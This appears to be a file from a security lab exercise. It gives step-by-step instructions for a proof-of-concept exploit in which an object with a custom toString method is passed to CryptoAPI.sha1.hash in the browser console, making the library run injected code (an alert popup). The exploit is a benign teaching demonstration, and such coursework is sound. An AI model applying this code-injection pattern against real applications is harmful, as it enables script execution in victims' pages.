// EXPLOIT 1

// How to run the following exploit:

// 1. Double click index.html to open it in any browser. Are you using GitHub Codespaces?

// Please note that if you are inside a codespace, it is not possible to perform step 1. For
// this reason, please create a local copy for the file 'index.html'. You can do so by copying 
// and pasting the contents of 'index.html' in a local file so that you can open it in a browser.
// Then, follow the remaining steps.

// 2. Copy the following line, paste it in the javascript console and press enter.
var s = { toString: function() { alert('Exploit 1'); } };

// 3. Now copy this line, paste it in the javascript console and press enter.
CryptoAPI.sha1.hash(s)

// 4. A popup should appear with the text "Exploit 1" in it. If it does, the exploit was successful.

// 5. Refresh the page to reset the level.

// * If the exploit was unsuccessful, you can proceed to the next exploit inside hack-2.js.